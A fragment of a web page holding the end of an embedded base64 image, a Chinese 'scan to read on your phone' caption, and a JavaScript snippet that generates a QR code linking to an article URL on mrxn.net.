OpBnipb3905gGAjEWwNzPHoUvyXZYw5av6w7t8/rjNag9TCXEULPnHP3g/BA+zcnaxmh+TLf59B8sM17797azygcBrJXtPj3nMAayHvO+fIubxuIrqPj6OmgXXv7IDjXCyE4aGh/RgjdnGod5jLC1p+1We5eGWc+cxD9YY5vG4gfaOHtdnQGPzoQiKnnDWHkrJ+9VVlX7rozhNgTqFZg+CMujJz2UdTClIjvA17vkVrX9EcHUruu5OUTWAN5+eh+p3AYSH8l+/XRY/RerWd+GK+5fapxmHsWXT9DiL2B2jb7gPKjLXPOa8E9ga0PYg3c1fjtOmEw26/i+xgGsi1Zq3efQB0IUN4MuIZHDwqtx0/4Zj38Zs00GPeH4LLfPSA0IMtDDtQzsgjBuZew1wBTUwRq3zqQqXORbz+BNZC3H/nxhv8DAAD//6JMKnsAAAAGSURBVAMAqjhMoUPRtVAAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-tianma-op-ids-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 